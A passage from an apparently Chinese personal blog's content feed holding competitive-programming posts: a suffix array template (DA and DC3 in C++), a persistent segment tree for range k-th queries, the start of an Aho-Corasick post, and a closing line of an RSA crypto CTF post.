alt="3"></p><p>你也可以多取几个其它的数试试看，看看能不能得到一样的结果，因为质数随机生成，print(c)这一步不能保证一模一样，但是dec的值一定是和你输入的m一样的。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SA板子</title>
      <link href="/2022/04/02/SA%E6%9D%BF%E5%AD%90/"/>
      <url>/2022/04/02/SA%E6%9D%BF%E5%AD%90/</url>
      
        <content type="html"><![CDATA[<p>本篇博客只有板子。</p><span id="more"></span><p>sa[i]：排名为i的后缀的下标</p><p>rak[i]：后缀suff[i]的排名</p><p>Height[i]：后缀按照字典排序之后，该后缀与上一个后缀的最长公共前缀，也就是排名为i的后缀字符串和排名为i-1的后缀字符串的最长公共前缀。</p><h2 id="DA算法-O-nlogn"><a href="#DA算法-O-nlogn" class="headerlink" title="DA算法(O(nlogn))"></a>DA算法(O(nlogn))</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100010</span>;</span><br><span class="line"><span class="keyword">int</span> wa[N],wb[N],wv[N],wss[N],rak[N],height[N],cal[N],n,sa[N];</span><br><span class="line"><span class="keyword">char</span> s[N];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> *r,<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> l)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="keyword">return</span> r[a]==r[b]&amp;&amp;r[a+l]==r[b+l];&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">da</span><span class="params">(<span class="keyword">int</span> *r,<span class="keyword">int</span> *sa,<span class="keyword">int</span> n,<span class="keyword">int</span> M)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> i,j,p,*x=wa,*y=wb,*t;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;M;i++) wss[i]=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) wss[x[i]=r[i]]++;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;M;i++) wss[i]+=wss[i<span class="number">-1</span>];</span><br><span class="line">     <span class="keyword">for</span>(i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--) sa[--wss[x[i]]]=i;</span><br><span class="line">     <span class="keyword">for</span>(j=<span class="number">1</span>,p=<span class="number">1</span>;p&lt;n;j*=<span class="number">2</span>,M=p) &#123;</span><br><span class="line">        <span class="keyword">for</span>(p=<span class="number">0</span>,i=n-j;i&lt;n;i++) y[p++]=i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) <span class="keyword">if</span>(sa[i]&gt;=j) y[p++]=sa[i]-j;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) wv[i]=x[y[i]];</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;M;i++) wss[i]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) wss[wv[i]]++;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;M;i++) wss[i]+=wss[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--) sa[--wss[wv[i]]]=y[i];</span><br><span class="line">        <span class="keyword">for</span>(t=x,x=y,y=t,p=<span class="number">1</span>,x[sa[<span class="number">0</span>]]=<span class="number">0</span>,i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">        x[sa[i]]=<span class="built_in">cmp</span>(y,sa[i<span class="number">-1</span>],sa[i],j)?p<span class="number">-1</span>:p++;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calheight</span><span class="params">(<span class="keyword">int</span> *r,<span class="keyword">int</span> *sa,<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> i,j,k=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++) rak[sa[i]]=i;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;height[rak[i++]]=k)</span><br><span class="line">     <span class="keyword">for</span>(k?k--:<span class="number">0</span>,j=sa[rak[i]<span class="number">-1</span>];r[i+k]==r[j+k];k++);</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i;i--)rak[i]=rak[i<span class="number">-1</span>],sa[i]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cas=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    cin&gt;&gt;k;</span><br><span class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s+<span class="number">1</span>))&#123;</span><br><span class="line">        n=<span class="built_in">strlen</span>(s+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">            cal[i]=s[i];</span><br><span class="line">        cal[n+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">da</span>(cal+<span class="number">1</span>,sa,n+<span class="number">1</span>,<span class="number">200</span>);</span><br><span class="line">        <span class="built_in">calheight</span>(cal+<span class="number">1</span>,sa,n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,height[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,sa[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,rak[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            ans+=rak[i]-height[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DC3算法-O-n"><a href="#DC3算法-O-n" class="headerlink" title="DC3算法(O(n))"></a>DC3算法(O(n))</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F(x) ((x) / 3 + ((x) % 3 == 1 ? 0 : tb))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> G(x) ((x) &lt; tb ? (x) * 3 + 1 : ((x) - tb) * 3 + 2)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">3</span>*(<span class="number">1e5</span>+<span class="number">5</span>);</span><br><span class="line"><span class="keyword">int</span> wa[N], wb[N], ws[N], wv[N], sa[N];</span><br><span class="line"><span class="keyword">int</span> rak[N], height[N], cal[N],n;</span><br><span class="line"><span class="keyword">char</span> s[N],ans[N],s1[N];</span><br><span class="line"><span class="keyword">int</span> cnt[N];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">c0</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> r[a] == r[b] &amp;&amp; r[a + <span class="number">1</span>] == r[b + <span class="number">1</span>] &amp;&amp; r[a + <span class="number">2</span>] == r[b + <span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">c12</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> *r, <span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (k == <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> r[a] &lt; r[b] || r[a] == r[b] &amp;&amp; <span class="built_in">c12</span>(<span class="number">1</span>, r, a + <span class="number">1</span>, b + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> r[a] &lt; r[b] || r[a] == r[b] &amp;&amp; wv[a + <span class="number">1</span>] &lt; wv[b + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Rsort</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> *a, <span class="keyword">int</span> *b, <span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) wv[i] = r[a[i]];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) ws[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) ws[wv[i]]++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; i++) ws[i] += ws[i - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) b[--ws[wv[i]]] = a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dc3</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> *sa, <span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, *rn = r + n, *san = sa + n, ta = <span class="number">0</span>, tb = (n + <span class="number">1</span>) / <span class="number">3</span>, tbc = <span class="number">0</span>, p;</span><br><span class="line">    r[n] = r[n + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) <span class="keyword">if</span> (i % <span class="number">3</span> != <span class="number">0</span>) wa[tbc++] = i;</span><br><span class="line">    <span class="built_in">Rsort</span>(r + <span class="number">2</span>, wa, wb, tbc, m);</span><br><span class="line">    <span class="built_in">Rsort</span>(r + <span class="number">1</span>, wb, wa, tbc, m);</span><br><span class="line">    <span class="built_in">Rsort</span>(r, wa, wb, tbc, m);</span><br><span class="line">    <span class="keyword">for</span> (p = <span class="number">1</span>, rn[<span class="built_in">F</span>(wb[<span class="number">0</span>])] = <span class="number">0</span>, i = <span class="number">1</span>; i &lt; tbc; i++)</span><br><span class="line">        rn[<span class="built_in">F</span>(wb[i])] = <span class="built_in">c0</span>(r, wb[i - <span class="number">1</span>], wb[i]) ? p - <span class="number">1</span> : p++;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; tbc) <span class="built_in">dc3</span>(rn, san, tbc, p);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; tbc; i++) san[rn[i]] = i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; tbc; i++) <span class="keyword">if</span> (san[i] &lt; tb) wb[ta++] = san[i] * <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">3</span> == <span class="number">1</span>) wb[ta++] = n - <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">Rsort</span>(r, wb, wa, ta, m);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; tbc; i++) wv[wb[i] = <span class="built_in">G</span>(san[i])] = i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>, p = <span class="number">0</span>; i &lt; ta &amp;&amp; j &lt; tbc; p++)</span><br><span class="line">        sa[p] = <span class="built_in">c12</span>(wb[j] % <span class="number">3</span>, r, wa[i], wb[j]) ? wa[i++] : wb[j++];</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; ta; p++) sa[p] = wa[i++];</span><br><span class="line">    <span class="keyword">for</span> (; j &lt; tbc; p++) sa[p] = wb[j++];</span><br><span class="line">    <span class="comment">//for(int i=n;i;i--) rak[i]=rak[i-1];</span></span><br><span class="line">    <span class="comment">//for(int i=n;i;i--) sa[i]++;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calheight</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> *sa, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) rak[sa[i]] = i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; height[rak[i++]] = k)</span><br><span class="line">        <span class="keyword">for</span> (k ? k-- : <span class="number">0</span>, j = sa[rak[i] - <span class="number">1</span>]; r[i + k] == r[j + k]; k++);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i;i--) rak[i]=rak[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i;i--) sa[i]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s+<span class="number">1</span>)&amp;&amp;s[<span class="number">1</span>] != <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">        n = <span class="built_in">strlen</span>(s+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">            cal[i] = s[i] - <span class="string">&#x27;a&#x27;</span> + <span class="number">1</span>;</span><br><span class="line">        cal[n+<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">dc3</span>(cal+<span class="number">1</span>, sa, n + <span class="number">1</span>, <span class="number">30</span>);</span><br><span class="line">        <span class="built_in">calheight</span>(cal+<span class="number">1</span>, sa, n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,height[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 字符串 </category>
          
          <category> SA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>主席树的学习</title>
      <link href="/2022/04/02/%E4%B8%BB%E5%B8%AD%E6%A0%91/"/>
      <url>/2022/04/02/%E4%B8%BB%E5%B8%AD%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<p>主席树应用之一：区间第k大，中间还有用到vector离散化</p><span id="more"></span><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">2e5</span>+<span class="number">10</span>;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;v;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l,r,sum;</span><br><span class="line">    <span class="comment">//l为一个离散化变量的左边界，r为右边界，都是对于值域而言的，sum存储数值在[l,r]区间内的数的个数 </span></span><br><span class="line">&#125;node;</span><br><span class="line">node tree[maxn*<span class="number">20</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">getid</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">lower_bound</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>(),x)-v.<span class="built_in">begin</span>()+<span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">0</span>,po=<span class="number">1</span>;<span class="keyword">char</span> ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch)&amp;&amp;ch!=<span class="string">&#x27;-&#x27;</span>) ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">if</span> (ch==<span class="string">&#x27;-&#x27;</span>) po=<span class="number">-1</span>,ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) a=a*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>,ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> a*po; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> n,m,a[maxn],root[maxn],cnt;<span class="comment">//n,m如题意所示，a为原数组，cnt为已分配节点数量 </span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> pre,<span class="keyword">int</span> &amp;now,<span class="keyword">int</span> p)</span></span>&#123;</span><br><span class="line">    tree[++cnt]=tree[pre];</span><br><span class="line">    now=cnt;</span><br><span class="line">    tree[now].sum++;</span><br><span class="line">    <span class="keyword">if</span>(l==r)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> m=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(p&lt;=m)<span class="built_in">insert</span>(l,m,tree[pre].l,tree[now].l,p);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">insert</span>(m+<span class="number">1</span>,r,tree[pre].r,tree[now].r,p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> start,<span class="keyword">int</span> end,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l==r)<span class="keyword">return</span> l;</span><br><span class="line">    <span class="keyword">int</span> m=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> tmp=tree[tree[end].l].sum-tree[tree[start].l].sum;</span><br><span class="line">    <span class="keyword">if</span>(k&lt;=tmp)<span class="keyword">return</span> <span class="built_in">query</span>(l,m,tree[start].l,tree[end].l,k);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">query</span>(m+<span class="number">1</span>,r,tree[start].r,tree[end].r,k-tmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">     n=<span class="built_in">read</span>(),m=<span class="built_in">read</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        v.<span class="built_in">push_back</span>(a[i]=<span class="built_in">read</span>());</span><br><span class="line">    <span class="built_in">sort</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>());</span><br><span class="line">    v.<span class="built_in">erase</span>(<span class="built_in">unique</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>()),v.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">insert</span>(<span class="number">1</span>,v.<span class="built_in">size</span>(),root[i<span class="number">-1</span>],root[i],<span class="built_in">getid</span>(a[i]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> l,r,k;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        l=<span class="built_in">read</span>(),r=<span class="built_in">read</span>(),k=<span class="built_in">read</span>();</span><br><span class="line">        cout&lt;&lt;v[<span class="built_in">query</span>(<span class="number">1</span>,v.<span class="built_in">size</span>(),root[l<span class="number">-1</span>],root[r],k)<span class="number">-1</span>]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 数据结构 </category>
          
          <category> 主席树 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AC自动机的学习</title>
      <link href="/2022/04/02/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/04/02/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>洛谷的板子</p><span id="more"></span><h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p><img src="/2022/04/02/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png" alt="1"></p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 